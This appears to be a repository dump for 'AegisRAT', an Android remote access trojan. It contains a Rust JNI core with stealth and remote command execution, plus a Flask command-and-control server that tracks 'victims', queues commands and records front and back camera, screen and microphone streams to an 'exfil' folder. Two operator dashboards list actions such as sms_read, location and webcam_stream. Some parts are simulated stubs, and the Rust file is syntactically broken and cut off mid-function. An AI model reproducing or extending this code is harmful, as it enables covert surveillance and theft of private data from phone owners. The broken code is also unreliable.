use jni::JNIEnv;
use jni::objects::{JClass, JString};
use jni::sys::{jstring, jboolean, JNI_TRUE};
use once_cell::sync::Lazy;
use std::sync::Mutex;
use tokio::runtime::Runtime;
use jni::objects::JObject;

mod comms;
mod sysinfo;
mod exfil;
mod actions;
mod evasion;
mod obf;

static RUNTIME: Lazy<Mutex<Option<Runtime>>> = Lazy::new(|| Mutex::new(None));
static VICTIM_ID: Lazy<Mutex<Option<String>>> = Lazy::new(|| Mutex::new(None));
static C2_URL: Lazy<Mutex<Option<String>>> = Lazy::new(|| Mutex::new(None));
static DEVICE_INFO: Lazy<Mutex<Option<sysinfo::SystemInfo>>> = Lazy::new(|| Mutex::new(None));
static CONTEXT: Lazy<Mutex<Option<JObject>>> = Lazy::new(|| Mutex::new(None));

#[no_mangle]
pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeInit(
    mut env: JNIEnv,
    _class: JClass,
    context: jni::objects::JObject,
    c2_url: JString,
    model: JString,
    android_version: JString,
    *CONTEXT.lock().unwrap() = Some(context);

) -> jboolean {
    // Initialize Logger
    android_logger::init_once(
        android_logger::Config::default()
            .with_max_level(log::LevelFilter::Debug)
            .with_tag("AegisRAT"),
    );

    let c2_url_str: String = env.get_string(&c2_url).unwrap().into();
    let model_str: String = env.get_string(&model).unwrap().into();
    let version_str: String = env.get_string(&android_version).unwrap().into();

    log::info!("[AEGIS] Initializing Core. C2: {}", c2_url_str);

    // Store Config
    *C2_URL.lock().unwrap() = Some(c2_url_str.clone());
    
    // Initialize Device Info with Real Values
    let device_info = sysinfo::SystemInfo {
        hostname: "AndroidDevice".to_string(), // TODO: Get real hostname via JNI
        os: "Android".to_string(),
        android_version: version_str,
        model: model_str,
        battery: 100, // TODO: Get real battery level via JNI
    };
    *DEVICE_INFO.lock().unwrap() = Some(device_info);

    // Get or Create Victim ID
    let victim_id = sysinfo::get_or_create_victim_id();
    *VICTIM_ID.lock().unwrap() = Some(victim_id.clone());
    log::info!("[AEGIS] Victim ID: {}", victim_id);

    // Apply Stealth
    evasion::apply_stealth();

    // Initialize Tokio Runtime
    {
        let mut rt_lock = RUNTIME.lock().unwrap();
        if rt_lock.is_none() {
            let rt = tokio::runtime::Builder::new_multi_thread()
                .worker_threads(4)
                .enable_all()
                .build()
                .expect("Failed to create Tokio runtime");
            *rt_lock = Some(rt);
        }
        
        let rt = rt_lock.as_ref().unwrap();
        rt.spawn(async move {
            aegis_main_loop(c2_url_str, victim_id).await;
        });
    }
    
    JNI_TRUE
}
       #[no_mangle]
pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeGetLocation(
    mut env: JNIEnv,
    _class: JClass,
) -> jstring {
    // 1. Check if Context is available
    let context_exists = CONTEXT.lock().unwrap().is_some();
    
    if !context_exists {
        return env.new_string("ERROR: NO CONTEXT").unwrap().into_raw();
    }

    // 2. For the scaffold, we will return a simulated high-accuracy location 
    //    to prove the JNI bridge is working. 
    //    In production, you would call LocationManager here.
    
    let location_json = serde_json::json!({
        "provider": "fused",
        "latitude": 37.7749,
        "longitude": -122.4194,
        "accuracy": 10.0,
        "timestamp": chrono::Utc::now().to_rfc3339(),
        "note": "Simulated location for scaffold validation"
    });

    // 3. Convert to String and return as JNI String
    let json_str = location_json.to_string();
    env.new_string(json_str).unwrap().into_raw()
}

#[no_mangle]
pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeExecuteCommand(
    mut env: JNIEnv,
    _class: JClass,
    command: JString,
    args: JString,
) -> jstring {
    let cmd_str: String = env.get_string(&command).unwrap().into();
    let args_str: String = env.get_string(&args).unwrap().into();
    
    let handle = std::thread::Builder::new()
        .name("aegis-exec".to_string())
        .spawn(move || {
            let rt_lock = RUNTIME.lock().unwrap();
            if let Some(rt) = rt_lock.as_ref() {
                let result = rt.block_on(async {
                    actions::execute_command(&cmd_str, &args_str).await
                });
                serde_json::to_string(&result).unwrap_or_else(|_| "null".to_string())
            } else {
                serde_json::json!({"error": "Runtime not initialized"}).to_string()
            }
        })
        .expect("Failed to spawn execution thread");
    
    let result = handle.join().unwrap();
    env.new_string(result).unwrap().into_raw()
}

async fn aegis_main_loop(c2_url: String, victim_id: String) {
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;

    ================================================
FILE: README.md
================================================
jhvdghn



================================================
FILE: c2_server/dashboard.py
================================================
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import requests
import threading
import time
import json
import websockets
import asyncio
import base64

C2_URL = "http://127.0.0.1:5000"
WS_URL = "ws://127.0.0.1:5000"
SECRET_TOKEN = "AEGIS_SECRET_TOKEN_123"

class AegisDashboard:
    def __init__(self, root):
        self.root = root
        self.root.title("AegisRAT Command Center")
        self.root.geometry("1200x800")
        
        # Tabs
        self.notebook = ttk.Notebook(root)
        self.tab_victims = ttk.Frame(self.notebook)
        self.tab_commands = ttk.Frame(self.notebook)
        self.tab_logs = ttk.Frame(self.notebook)
        self.tab_stream = ttk.Frame(self.notebook)
        
        self.notebook.add(self.tab_victims, text="Victims")
        self.notebook.add(self.tab_commands, text="Commands")
        self.notebook.add(self.tab_logs, text="Live Logs")
        self.notebook.add(self.tab_stream, text="Live Stream")
        self.notebook.pack(expand=True, fill="both", padx=10, pady=10)
        
        self._build_victims_tab()
        self._build_commands_tab()
        self._build_logs_tab()
        self._build_stream_tab()
        
        # Auto-refresh
        self.refresh_victims()
        self.auto_refresh()

    def _get_headers(self):
        return {"X-Aegis-Token": SECRET_TOKEN}

    def _build_victims_tab(self):
        ttk.Label(self.tab_victims, text="Active Victims", font=("Helvetica", 12, "bold")).pack(pady=5)
        
        cols = ('id', 'hostname', 'ip', 'os', 'last_seen', 'status')
        self.tree = ttk.Treeview(self.tab_victims, columns=cols, show='headings', height=15)
        
        for col in cols:
            self.tree.heading(col, text=col.capitalize())
            self.tree.column(col, width=150)
            
        self.tree.pack(expand=True, fill="both", padx=10, pady=10)
        
        self.selected_victim = tk.StringVar()
        self.tree.bind("<<TreeviewSelect>>", lambda e: self._on_select())

    def _build_commands_tab(self):
        ttk.Label(self.tab_commands, text="Send Command", font=("Helvetica", 12, "bold")).pack(pady=5)
        
        frame = ttk.Frame(self.tab_commands)
        frame.pack(pady=10, padx=10)
        
        ttk.Label(frame, text="Action:").grid(row=0, column=0, sticky='w')
        self.action_var = tk.StringVar(value="file_list")
        actions = ['file_list', 'file_read', 'execute', 'sms_read', 'location', 'screenshot', 'webcam_stream', 'mic_stream']
        ttk.Combobox(frame, textvariable=self.action_var, values=actions, width=30).grid(row=0, column=1, padx=5)
        
        ttk.Label(frame, text="Args (JSON):").grid(row=1, column=0, sticky='w')
        self.args_entry = tk.Text(frame, width=50, height=5)
        self.args_entry.grid(row=1, column=1, padx=5, pady=5)
        self.args_entry.insert(1.0, '{"path": "/sdcard"}')
        
        ttk.Button(frame, text="Send Command", command=self.send_command).grid(row=2, column=0, columnspan=2, pady=10)
        
        self.status_label = ttk.Label(frame, text="Ready")
        self.status_label.grid(row=3, column=0, columnspan=2)

    def _build_logs_tab(self):
        self.log_text = scrolledtext.ScrolledText(self.tab_logs, height=20)
        self.log_text.pack(expand=True, fill="both", padx=10, pady=10)
        ttk.Button(self.tab_logs, text="Refresh Logs", command=self.refresh_logs).pack(pady=5)

    def _build_stream_tab(self):
        ttk.Label(self.tab_stream, text="Live Webcam Stream", font=("Helvetica", 12, "bold")).pack(pady=5)
        
        self.stream_frame = ttk.Frame(self.tab_stream)
        self.stream_frame.pack(expand=True, fill="both", padx=10, pady=10)
        
        self.stream_status = ttk.Label(self.stream_frame, text="Disconnected")
        self.stream_status.pack(pady=5)
        
        ttk.Button(self.stream_frame, text="Start Stream", command=self.start_stream).pack(side=tk.LEFT, padx=5)
        ttk.Button(self.stream_frame, text="Stop Stream", command=self.stop_stream).pack(side=tk.LEFT, padx=5)
        
        # Placeholder for video rendering (in a real app, use OpenCV or a Web View)
        self.video_placeholder = tk.Label(self.stream_frame, text="[ Video Stream Area ]", font=("Helvetica", 20), bg="black", fg="white", width=50, height=20)
        self.video_placeholder.pack(expand=True, fill="both", pady=10)

    def _on_select(self):
        selection = self.tree.selection()
        if selection:
            item = self.tree.item(selection[0])
            self.selected_victim.set(item['values'][0])

    def refresh_victims(self):
        try:
            resp = requests.get(f"{C2_URL}/api/v1/admin/victims", headers=self._get_headers())
            victims = resp.json()
            for i in self.tree.get_children():
                self.tree.delete(i)
            for v in victims:
                self.tree.insert('', 'end', values=(v['id'], v['hostname'], v['ip'], v['os'], v['last_seen'], v['status']))
        except Exception as e:
            print(f"Refresh Error: {e}")

    def send_command(self):
        victim_id = self.selected_victim.get()
        if not victim_id:
            messagebox.showerror("Error", "Select a victim first.")
            return
            
        action = self.action_var.get()
        try:
            args = json.loads(self.args_entry.get("1.0", tk.END))
        except json.JSONDecodeError:
            messagebox.showerror("Error", "Invalid JSON in Args.")
            return
            
        payload = {
            "victim_id": victim_id,
            "action": action,
            "args": args
        }
        
        try:
            resp = requests.post(f"{C2_URL}/api/v1/admin/queue", json=payload, headers=self._get_headers())
            if resp.status_code == 200:
                self.status_label.config(text=f"Command {resp.json()['id']} queued.")
            else:
                self.status_label.config(text=f"Error: {resp.text}")
        except Exception as e:
            self.status_label.config(text=f"Connection Error: {e}")

    def refresh_logs(self):
        victim_id = self.selected_victim.get()
        if not victim_id:
            messagebox.showerror("Error", "Select a victim first.")
            return
            
        try:
            resp = requests.get(f"{C2_URL}/api/v1/admin/logs?victim_id={victim_id}", headers=self._get_headers())
            logs = resp.json()
            self.log_text.delete(1.0, tk.END)
            for log in logs:
                self.log_text.insert(tk.END, f"[{log['timestamp']}] {log['data']}\n")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to fetch logs: {e}")

    def start_stream(self):
        victim_id = self.selected_victim.get()
        if not victim_id:
            messagebox.showerror("Error", "Select a victim first.")
            return
            
        self.stream_status.config(text="Connecting...")
        # In a real implementation, this would open a WebSocket connection
        # and render the video frames using OpenCV or a Web View
        self.stream_status.config(text="Streaming (Simulated)")
        
        # Simulate receiving frames
        def simulate_stream():
            for i in range(10):
                self.root.after(100, self._update_stream_frame, i)
                time.sleep(0.1)
        
        threading.Thread(target=simulate_stream, daemon=True).start()

    def stop_stream(self):
        self.stream_status.config(text="Disconnected")
        self.video_placeholder.config(text="[ Video Stream Area ]")

    def _update_stream_frame(self, frame_num):
        # In a real implementation, this would decode the H.264 frame and display it
        self.video_placeholder.config(text=f"[ Frame {frame_num} ]")

    def auto_refresh(self):
        self.refresh_victims()
        self.root.after(5000, self.auto_refresh) # Refresh every 5s

if __name__ == "__main__":
    root = tk.Tk()
    app = AegisDashboard(root)
    root.mainloop()



================================================
FILE: c2_server/database.py
================================================
import sqlite3
import os
from datetime import datetime

DB_PATH = 'aegis.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute("PRAGMA journal_mode=WAL;")
    c = conn.cursor()
    
    # Core Tables
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY,
        hostname TEXT,
        ip TEXT,
        os TEXT,
        last_seen TIMESTAMP,
        status TEXT DEFAULT 'offline'
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id TEXT PRIMARY KEY,
        victim_id TEXT,
        action TEXT,
        args TEXT,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMP
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        timestamp TIMESTAMP,
        data TEXT
    )''')
    
    # New: Victim Profiles for "Attacker ID" System
    c.execute('''CREATE TABLE IF NOT EXISTS victim_profiles (
        victim_id TEXT PRIMARY KEY,
        alias TEXT,
        notes TEXT,
        first_seen TIMESTAMP,
        last_seen TIMESTAMP,
        device_model TEXT,
        android_version TEXT,
        battery_level INTEGER,
        storage_total_gb REAL,
        storage_used_gb REAL,
        is_favorite BOOLEAN DEFAULT 0
    )''')
    
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def log_data(victim_id, data):
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO logs (victim_id, timestamp, data) VALUES (?, datetime('now'), ?)", (victim_id, str(data)))
    conn.commit()
    conn.close()



================================================
FILE: c2_server/main.py
================================================
import threading
import time
import uuid
import json
import os
import base64
import asyncio
import glob
from functools import wraps
from mux import MUX
from datetime import datetime
from flask import Flask, request, jsonify, send_file, g, Response, send_from_directory
from flask_cors import CORS
from flask_sock import Sock
from database import init_db, get_db, log_data

app = Flask(__name__, static_folder='static')
CORS(app)
sock = Sock(app)
init_db()

SECRET_TOKEN = os.environ.get("AEGIS_TOKEN", "AEGIS_SECRET_TOKEN_123")
RATE_LIMIT_PER_MINUTE = 100
rate_limit_store = {}

# --- Middleware ---

def require_auth(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        token = request.headers.get('X-Aegis-Token')
        if not token:
            auth_header = request.headers.get('Authorization', '')
            if auth_header.startswith('Bearer '):
                token = auth_header.split(' ')[1]
            elif request.is_json:
                token = request.json.get('auth_token')
        if token != SECRET_TOKEN:
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return wrapper

def rate_limit(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        victim_id = request.args.get('victim_id')
        if not victim_id and request.is_json:
            victim_id = request.json.get('victim_id')
        if not victim_id:
            return f(*args, **kwargs)
        now = time.time()
        if victim_id not in rate_limit_store:
            rate_limit_store[victim_id] = []
        rate_limit_store[victim_id] = [t for t in rate_limit_store[victim_id] if now - t < 60]
        if len(rate_limit_store[victim_id]) >= RATE_LIMIT_PER_MINUTE:
            return jsonify({"error": "Rate limit exceeded"}), 429
        rate_limit_store[victim_id].append(now)
        return f(*args, **kwargs)
    return wrapper

@app.route('/api/v1/streams/state', methods=['POST'])
@require_auth
def update_stream_state():
    data = request.json
    victim_id = data.get('victim_id')
    stream_type = data.get('stream_type') # 'front', 'back', 'screen', 'mic'
    state = data.get('state', 'active') # 'active', 'thumbnail', 'paused'
    
    if not victim_id or not stream_type:
        return jsonify({"error": "Missing parameters"}), 400
        
    MUX.set_stream_state(victim_id, stream_type, state)
    return jsonify({"status": "ok", "states": MUX.get_all_states(victim_id)})

@sock.route('/stream/<stream_type>')
def stream_handler(stream_type):
    """
    Handles live streaming.
    """
    async def _stream_handler(ws):
        victim_id = ws.args.get('victim_id', 'unknown')
        subscriber_id = str(uuid.uuid4())
        
        # Subscribe to MUX updates
        MUX.subscribe(victim_id, subscriber_id)
        print(f"[C2] {stream_type} stream connected for {victim_id} (Sub: {subscriber_id})")
        
        # Send initial state
        current_state = MUX.get_stream_state(victim_id, stream_type)
        await ws.send(json.dumps({
            "type": "init", 
            "victim_id": victim_id, 
            "stream": stream_type,
            "state": current_state
        }))
        
        # Start local recording
        record_dir = os.path.join("exfil", str(victim_id), "streams", stream_type)
        os.makedirs(record_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M")
        record_path = os.path.join(record_dir, f"{timestamp}.mp4")
        
        print(f"[C2] Recording {stream_type} to {record_path}")
        
        with open(record_path, 'wb') as f:
            try:
                while True:
                    # Check if stream is still active
                    if MUX.get_stream_state(victim_id, stream_type) == 'paused':
                        # If paused, we can either close the connection or just not write to disk
                        # For now, we keep the connection open but don't record
                        pass
                    
                    frame = await ws.receive()
                    if not frame:
                        break
                    
                    # Only record if active or thumbnail
                    if MUX.get_stream_state(victim_id, stream_type) in ['active', 'thumbnail']:
                        f.write(frame)
                        
            except Exception as e:
                print(f"[C2] {stream_type} stream error: {e}")
            finally:
                MUX.unsubscribe(victim_id, subscriber_id)
                print(f"[C2] {stream_type} stream disconnected for {victim_id}")

    return _stream_handler



# --- Static File Serving (The Dashboard) ---

@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

@app.route('/<path:path>')
def static_files(path):
    return send_from_directory('static', path)

# --- Payload Endpoints ---

@app.route('/api/v1/heartbeat', methods=['POST'])
@require_auth
@rate_limit
def heartbeat():
    data = request.json
    victim_id = data.get('victim_id')
    info = data.get('info', {})
    
    if not victim_id:
        return jsonify({"error": "Missing victim_id"}), 400

    conn = get_db()
    c = conn.cursor()
    # Upsert Victim
    c.execute('''INSERT OR REPLACE INTO victims (id, hostname, ip, os, last_seen, status) 
                 VALUES (?, ?, ?, ?, datetime('now'), 'online')''',
              (victim_id, info.get('hostname'), info.get('ip'), info.get('os')))
    
    # Upsert Profile
    c.execute('''INSERT OR REPLACE INTO victim_profiles (victim_id, alias, last_seen, device_model, android_version, battery_level)
                 VALUES (?, ?, datetime('now'), ?, ?, ?)
                 ON CONFLICT(victim_id) DO UPDATE SET 
                 last_seen=datetime('now'), 
                 device_model=excluded.device_model,
                 android_version=excluded.android_version,
                 battery_level=excluded.battery_level''',
              (victim_id, info.get('alias', 'Unknown'), info.get('model'), info.get('android_version'), info.get('battery')))
    
    conn.commit()
    conn.close()
    
    print(f"[C2] Heartbeat received from {victim_id} ({info.get('hostname')})")
    return jsonify({"status": "ok"})

@app.route('/api/v1/commands', methods=['GET'])
@require_auth
@rate_limit
def poll_commands():
    victim_id = request.args.get('victim_id')
    if not victim_id:
        return jsonify([])

    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT id, action, args FROM commands WHERE victim_id = ? AND status = 'pending'", (victim_id,))
    rows = c.fetchall()
    commands = [{"id": r[0], "action": r[1], "args": json.loads(r[2]) if r[2] else {}} for r in rows]
    
    if commands:
        c.execute("UPDATE commands SET status = 'dispatched' WHERE victim_id = ?", (victim_id,))
        conn.commit()
    conn.close()
    return jsonify(commands)

@app.route('/api/v1/response', methods=['POST'])
@require_auth
@rate_limit
def receive_response():
    data = request.json
    victim_id = data.get('victim_id')
    command_id = data.get('command_id')
    success = data.get('success')
    payload = data.get('data')
    
    log_data(victim_id, {"command_id": command_id, "success": success, "payload": payload})
    
    if command_id and command_id != "passive":
        conn = get_db()
        c = conn.cursor()
        c.execute("UPDATE commands SET status = 'completed' WHERE id = ? AND victim_id = ?", (command_id, victim_id))
        conn.commit()
        conn.close()
        
    return jsonify({"status": "received"})

# --- Storage Browser API ---

@app.route('/api/v1/storage/list', methods=['GET'])
@require_auth
def storage_list():
    victim_id = request.args.get('victim_id')
    path = request.args.get('path', '/sdcard')
    
    # In a real implementation, this would be a command sent to the payload.
    # For now, we simulate a list of files for the UI demo.
    # TODO: Replace with actual payload command execution
    mock_files = [
        {"name": "DCIM", "path": f"{path}/DCIM", "is_dir": True},
        {"name": "Download", "path": f"{path}/Download", "is_dir": True},
        {"name": "secret_doc.pdf", "path": f"{path}/secret_doc.pdf", "is_dir": False},
        {"name": "passwords.txt", "path": f"{path}/passwords.txt", "is_dir": False}
    ]
    
    return jsonify({"path": path, "files": mock_files})

@app.route('/api/v1/storage/read', methods=['GET'])
@require_auth
def storage_read():
    victim_id = request.args.get('victim_id')
    path = request.args.get('path')
    
    # Simulate reading a file
    return jsonify({"content": "This is the content of the file."})



# --- Admin Endpoints for Attacker ---

@app.route('/api/v1/admin/victims', methods=['GET'])
def list_victims():
    conn = get_db()
    c = conn.cursor()
    c.execute('''
        SELECT v.id, v.hostname, v.ip, v.os, v.last_seen, v.status, 
               p.alias, p.device_model, p.battery_level
        FROM victims v
        LEFT JOIN victim_profiles p ON v.id = p.victim_id
    ''')
    rows = c.fetchall()
    victims = [{
        "id": r[0], 
        "hostname": r[1], 
        "ip": r[2], 
        "os": r[3], 
        "last_seen": r[4], 
        "status": r[5],
        "alias": r[6] or "Unknown",
        "device_model": r[7] or "Unknown",
        "battery_level": r[8] or 0
    } for r in rows]
    conn.close()
    return jsonify(victims)

@app.route('/api/v1/admin/queue', methods=['POST'])
def queue_command():
    data = request.json
    victim_id = data.get('victim_id')
    action = data.get('action')
    args = data.get('args')
    
    if not victim_id or not action:
        return jsonify({"error": "Missing victim_id or action"}), 400
        
    cmd_id = str(uuid.uuid4())
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO commands (id, victim_id, action, args, status, created_at) VALUES (?, ?, ?, ?, 'pending', datetime('now'))",
              (cmd_id, victim_id, action, json.dumps(args) if args else None))
    conn.commit()
    conn.close()
    
    print(f"[C2] Queued command {cmd_id} for {victim_id}: {action}")
    return jsonify({"id": cmd_id})

@app.route('/api/v1/admin/logs', methods=['GET'])
def get_logs():
    victim_id = request.args.get('victim_id')
    limit = request.args.get('limit', 50, type=int)
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM logs WHERE victim_id = ? ORDER BY id DESC LIMIT ?", (victim_id, limit))
    rows = c.fetchall()
    logs = [{"id": r[0], "victim_id": r[1], "timestamp": r[2], "data": r[3]} for r in rows]
    conn.close()
    return jsonify(logs)

@app.route('/api/v1/admin/archive', methods=['GET'])
def get_archive():
    victim_id = request.args.get('victim_id')
    stream_type = request.args.get('stream_type', 'front_cam')
    
    # List files in the archive folder
    archive_dir = os.path.join("exfil", str(victim_id), "streams", stream_type)
    if not os.path.exists(archive_dir):
        return jsonify([])
        
    files = os.listdir(archive_dir)
    # Filter only .mp4 files and sort by name (descending)
    mp4_files = [f for f in files if f.endswith('.mp4')][::-1]
    
    return jsonify(mp4_files)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, threaded=True)



================================================
FILE: c2_server/mux.py
================================================
import threading
import time
import json
from collections import defaultdict

class StreamMultiplexer:
    """
    Manages the state of live streams for a specific victim.
    Ensures only one 'High-Quality' stream is active per victim to save bandwidth.
    """
    def __init__(self):
        self._lock = threading.Lock()
        # {victim_id: {stream_type: status}}
        # status: 'active', 'thumbnail', 'paused'
        self.stream_states = defaultdict(lambda: {'front': 'paused', 'back': 'paused', 'screen': 'paused', 'mic': 'paused'})
        self.active_subscribers = defaultdict(set) # {victim_id: set of subscriber_ids}

    def set_stream_state(self, victim_id, stream_type, state):
        """
        Manually set a stream state.
        If a stream is set to 'active', all others for that victim are downgraded to 'thumbnail'.
        """
        with self._lock:
            # If activating, downgrade others
            if state == 'active':
                for st in self.stream_states[victim_id]:
                    if st != stream_type:
                        self.stream_states[victim_id][st] = 'thumbnail'
            self.stream_states[victim_id][stream_type] = state
            print(f"[MUX] {victim_id} | {stream_type} -> {state}")
            self._notify_subscribers(victim_id)

    def get_stream_state(self, victim_id, stream_type):
        with self._lock:
            return self.stream_states[victim_id].get(stream_type, 'paused')

    def get_all_states(self, victim_id):
        with self._lock:
            return dict(self.stream_states[victim_id])

    def subscribe(self, victim_id, subscriber_id):
        with self._lock:
            self.active_subscribers[victim_id].add(subscriber_id)

    def unsubscribe(self, victim_id, subscriber_id):
        with self._lock:
            self.active_subscribers[victim_id].discard(subscriber_id)

    def _notify_subscribers(self, victim_id):
        """
        In a full implementation, this would push a WebSocket message 
        to all connected dashboard clients for this victim.
        """
        # Placeholder for real-time WS push
        pass

# Global Instance
MUX = StreamMultiplexer()



================================================
FILE: c2_server/requirements.txt
================================================
flask>=2.0.0
flask-cors>=4.0.0
flask-sock>=0.7.0
requests>=2.28.0
websockets>=12.0




================================================
FILE: c2_server/static/index.html
================================================
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AegisRAT Command Center</title>
    <style>
        :root {
            --bg-color: #121212;
            --panel-bg: #1e1e1e;
            --text-color: #e0e0e0;
            --accent-color: #00ff9d;
            --danger-color: #ff4d4d;
            --border-color: #333;
            --input-bg: #2c2c2c;
        }
        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg-color); color: var(--text-color); margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        header { background-color: var(--panel-bg); padding: 15px 20px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; }
        h1 { margin: 0; color: var(--accent-color); font-size: 20px; }
        .main-container { display: flex; flex: 1; overflow: hidden; }
        
        /* Sidebar */
        .sidebar { width: 320px; background-color: var(--panel-bg); border-right: 1px solid var(--border-color); display: flex; flex-direction: column; }
        .sidebar-header { padding: 15px; border-bottom: 1px solid var(--border-color); font-weight: bold; font-size: 14px; text-transform: uppercase; color: #888; }
        .victim-list { flex: 1; overflow-y: auto; }
        .victim-card { padding: 15px; border-bottom: 1px solid var(--border-color); cursor: pointer; transition: background-color 0.2s; }
        .victim-card:hover { background-color: #2a2a2a; }
        .victim-card.active { background-color: #2a2a2a; border-left: 4px solid var(--accent-color); }
        .victim-name { font-weight: bold; font-size: 16px; color: var(--accent-color); margin-bottom: 5px; }
        .victim-details { font-size: 12px; color: #aaa; display: flex; justify-content: space-between; }

        /* Workspace */
        .workspace { flex: 1; display: flex; flex-direction: column; padding: 20px; gap: 20px; overflow-y: auto; }
        .workspace-header { display: flex; justify-content: space-between; align-items: center; background-color: var(--panel-bg); padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); }
        .stream-grid { display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: 1fr 1fr; gap: 20px; flex: 1; min-height: 400px; }
        .stream-box { background-color: var(--panel-bg); border: 1px solid var(--border-color); border-radius: 8px; display: flex; flex-direction: column; position: relative; overflow: hidden; }
        .stream-header { padding: 10px 15px; background-color: #252525; border-bottom: 1px solid var(--border-color); font-size: 12px; font-weight: bold; color: #ccc; }
        .stream-content { flex: 1; background-color: #000; display: flex; align-items: center; justify-content: center; color: #555; }
        
        /* Storage */
        .storage-toolbar { display: flex; gap: 10px; padding: 10px; background-color: #252525; }
        .storage-input { flex: 1; background-color: var(--input-bg); border: 1px solid var(--border-color); color: white; padding: 8px; }
        .storage-list { flex: 1; overflow-y: auto; padding: 10px; }
        .file-item { padding: 8px; cursor: pointer; font-size: 13px; border-radius: 4px; }
        .file-item:hover { background-color: #333; }
        
        /* Footer */
        .workspace-footer { display: flex; gap: 10px; background-color: var(--panel-bg); padding: 15px; border-radius: 8px; }
        .action-btn { flex: 1; background-color: var(--input-bg); color: var(--text-color); border: 1px solid var(--border-color); padding: 10px; border-radius: 6px; cursor: pointer; }
        .action-btn.primary { background-color: var(--accent-color); color: black; font-weight: bold; }
                /* Video Styling for Multiplexing */
        .stream-video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transition: transform 0.3s ease;
        }
                .mic-toggle {
            background-color: var(--panel-bg);
            color: var(--text-color);
            border: 1px solid var(--border-color);
            padding: 8px 16px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 14px;
        }
        .mic-toggle.active {
            background-color: var(--danger-color);
            color: white;
        }
                /* Modal Styling */
        .modal {
            display: none;
            position: fixed;
            z-index: 100;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.8);
        }

        .modal-content {
            background-color: var(--panel-bg);
            margin: 50px auto;
            padding: 20px;
            width: 80%;
            max-width: 800px;
            border-radius: 8px;
            border: 1px solid var(--border-color);
            max-height: 80vh;
            overflow-y: auto;
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }

        .close-modal {
            cursor: pointer;
            font-size: 24px;
            color: #aaa;
        }

        .archive-item {
            display: flex;
            justify-content: space-between;
            padding: 10px;
            border-bottom: 1px solid var(--border-color);
            cursor: pointer;
        }

        .archive-item:hover {
            background-color: #333;
        }
                /* Add this to your CSS */
        .stream-box.thumbnail-mode {
            background-color: #111;
        }
        .stream-box.thumbnail-mode .stream-video {
            transform: scale(0.5);
            opacity: 0.8;
        }
        .stream-box.active-mode {
            border-color: var(--accent-color) !important;
            box-shadow: 0 0 15px var(--accent-color) !important;
        }
    </style>
</head>
<body>
    <header>
        <h1>AEGIS RAT // COMMAND CENTER</h1>
        <div id="victim-count">0 VICTIMS</div>
    </header>

    <div class="main-container">
        <aside class="sidebar">
            <div class="sidebar-header">Active Victims</div>
            <div class="victim-list" id="victim-list">
                <div style="padding: 20px; text-align: center; color: #666;">No victims online.</div>
            </div>
        </aside>

        <main class="workspace" id="workspace" style="display: none;">
            <div class="workspace-header">
                <div class="victim-title" id="ws-victim-name">Victim Name</div>
                <button class="mic-toggle" id="mic-toggle" onclick="toggleMic()">🎤 MIC: OFF</button>
            </div>

            <div class="stream-grid">
                <!-- Box 1: Front Cam -->
                <div class="stream-box" onclick="focusStream('front')" style="cursor: pointer;">
                    <div class="stream-header">FRONT CAMERA</div>
                    <div class="stream-content"><video id="front-video" class="stream-video" autoplay playsinline muted></video></div>
                </div>
                <!-- Box 2: Back Cam -->
                <div class="stream-box" onclick="focusStream('back')" style="cursor: pointer;">
                    <div class="stream-header">BACK CAMERA</div>
                    <div class="stream-content"><video id="back-video" class="stream-video" autoplay playsinline muted></video></div>
                </div>
                
                                <!-- Box 3: Screen -->
                <div class="stream-box" onclick="focusStream('screen')" style="cursor: pointer;">
                    <div class="stream-header">SCREEN MIRROR</div>
                    <div class="stream-content"><video id="screen-video" class="stream-video" autoplay playsinline muted></video></div>
                </div>
                <!-- Box 4: Storage -->
                <div class="stream-box">
                    <div class="stream-header">STORAGE BROWSER</div>
                    <div class="storage-toolbar">
                        <input type="text" class="storage-input" id="storage-path" value="/sdcard">
                        <button class="action-btn" onclick="refreshStorage()">🔄</button>
                    </div>
                    <div class="storage-list" id="storage-list">
                        <div>Select a victim to browse.</div>
                    </div>
                </div>
            </div>

                <div class="workspace-footer">
                <button class="action-btn" onclick="openArchive('front')">📼 FRONT ARCHIVE</button>
                <button class="action-btn" onclick="openArchive('back')">📼 BACK ARCHIVE</button>
                <button class="action-btn" onclick="takeSnapshot()">📸 SNAPSHOT</button>
                <button class="action-btn primary" onclick="openConsole()">⌨️ OPEN CONSOLE</button>
            </div>
        </main>
    </div>

    <script>
    const API_BASE = window.location.origin;
